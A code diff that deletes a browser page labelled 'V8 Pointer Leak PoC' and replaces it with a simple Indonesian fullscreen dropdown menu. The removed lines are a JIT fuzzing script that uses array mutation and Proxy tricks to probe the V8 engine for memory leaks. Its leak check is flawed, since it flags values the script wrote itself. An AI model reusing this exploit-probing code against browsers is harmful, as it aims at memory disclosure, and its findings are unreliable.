@@ -1,99 +1,87 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>V8 Pointer Leak PoC - Ultra Strong</title>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Fullscreen Dropdown</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
 
-<h2>V8 Pointer Leak PoC - Ultra Strong (Read-Only)</h2>
-<pre id="log"></pre>
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin: 20px;
+      cursor: pointer;
+    }
+
+    /* Dropdown fullscreen */
+    .fullscreen-dropdown {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.9);
+      color: white;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .fullscreen-dropdown.show {
+      display: flex;
+    }
+
+    .fullscreen-dropdown a {
+      color: white;
+      font-size: 24px;
+      margin: 10px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+<button onclick="openFullscreen()">Buka Menu</button>
+
+<div id="dropdown" class="fullscreen-dropdown">
+  <a href="#">Menu 1</a>
+  <a href="#">Menu 2</a>
+  <a href="#">Menu 3</a>
+  <button onclick="closeFullscreen()">Tutup</button>
+</div>
 
 <script>
-const log = m => {
-    document.getElementById("log").textContent += m + "\n";
-    console.log(m);
-};
+  function openFullscreen() {
+    let elem = document.documentElement;
 
-// TARGET FUNCTION
-function vuln(a,i){ return a[i]+1.1; }
-
-// WARMUP
-function warmup(){
-    let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<200000;j++) vuln(arr,j%50);
-    return arr;
-}
-
-// AGGRESSIVE MUTATION
-function mutate(arr){
-    for(let i=0;i<20;i++) delete arr[i]; // more holes
-    arr.length = 10;
-    arr[100] = 1.7976931348623157e+308; // extreme float
-    arr[2] = {x:1}; // force object kind
-
-    Object.defineProperty(arr,3,{
-        get(){
-            arr.push(Math.random()*1e5);
-            return 1.1;
-        }
-    });
-    return arr;
-}
-
-// PROXY BREAK ASSUMPTION
-function breakAssumption(a){
-    return new Proxy(a,{
-        get(t,p){
-            if(p==="length"){
-                for(let i=0;i<20;i++) t.push(Math.random()*1e5);
-            }
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.7){
-                t.push(Math.random()*1e5);
-            }
-            return Reflect.get(t,p);
-        },
-        set(t,p,v){
-            if(Math.random()<0.3) t.length += 10;
-            return Reflect.set(t,p,v);
-        }
-    });
-}
-
-// LARGE TYPED ARRAY
-let buf = new ArrayBuffer(0x80000); // 512KB
-let f64 = new Float64Array(buf);
-
-// INIT PATTERN
-for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;
-
-// CHECK POINTER-LEAK
-function checkTyped(){
-    for(let i=0;i<f64.length;i++){
-        let v = f64[i];
-        if(Math.abs(v) > 1e12){
-            log(`[POINTER-LEAK] idx=${i} val=${v}`);
-        }
+    // Masuk fullscreen
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) {
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) {
+      elem.msRequestFullscreen();
     }
-}
 
-// MAIN LOOP
-function run(){
-    log("[*] warmup / JIT");
-    let base = warmup();
+    // Tampilkan dropdown
+    document.getElementById("dropdown").classList.add("show");
+  }
 
-    log("[*] starting ultra aggressive pointer-leak fuzzing...");
-    for(let i=0;i<500000;i++){
-        let arr = [...base];
-        arr = mutate(arr);
-        arr = breakAssumption(arr);
-
-        vuln(arr,5);
-
-        // overlay extreme float to typed array
-        f64[i % f64.length] = 1.7976931348623157e+308;
-
-        if(i%1000===0) checkTyped();
-        if(i%500===0) log(`iter ${i}`);
+  function closeFullscreen() {
+    // Keluar fullscreen
+    if (document.exitFullscreen) {
+      document.exitFullscreen();
     }
-    log("[*] done - ultra pointer leak scan finished");
-}
 
-run();
+    // Sembunyikan dropdown
+    document.getElementById("dropdown").classList.remove("show");
+  }
 </script>
+
+</body>
+</html>
